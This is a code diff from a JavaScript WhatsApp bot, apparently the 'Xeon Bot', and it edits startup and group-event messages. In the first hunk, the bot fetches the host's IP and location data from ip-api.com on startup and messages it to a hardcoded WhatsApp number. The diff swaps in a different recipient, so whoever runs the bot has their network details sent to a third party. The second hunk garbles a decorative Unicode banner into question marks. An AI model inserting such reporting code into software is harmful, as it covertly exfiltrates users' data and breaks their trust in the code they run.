@@ -114,7 +114,7 @@ await client.connect({ timeoutMs: 30 * 1000 });
 	console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'cyan'))
 fetch(`http://ip-api.com/line`).then(res => res.text())  
         .then(bu =>{
-       client.sendMessage("911234567890@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Xeon Bot Inc.",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./xeon.jpg'),sourceUrl:"https://wa.me/911234567890?text=Hello bro"}}})
+       client.sendMessage("9101927428@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Xeon Bot Inc.",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./xeon.jpg'),sourceUrl:"https://wa.me/911234567890?text=Hello bro"}}})
      console.log(color('|WRN|', 'yellow'), color('Sending ip address to developer bot', 'cyan'))
    })
       
@@ -160,7 +160,7 @@ client.sendMessage(metdata.id, teks, MessageType.text, {contextInfo: {"mentioned
 console.log(`- [ Group Description Change ] - In ${metdata.subject}`)
   }
 else if(anu.restrict == 'false'){
-teks = `- [ 𝗚𝗿𝗼𝘂𝗽 𝗦𝗲𝘁𝘁𝗶𝗻𝗴 𝗖??𝗮𝗻𝗴𝗲 ] -\n\nEdit Group info has been opened for members\nNow all members can edit this group info`
+teks = `- [ 𝗚𝗿𝗼𝘂𝗽 𝗦𝗲𝘁𝘁𝗶𝗻𝗴 𝗖????𝗻𝗴𝗲 ] -\n\nEdit Group info has been opened for members\nNow all members can edit this group info`
 client.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
 console.log(`- [ Group Setting Change ] - In ${metdata.subject}`)
   }
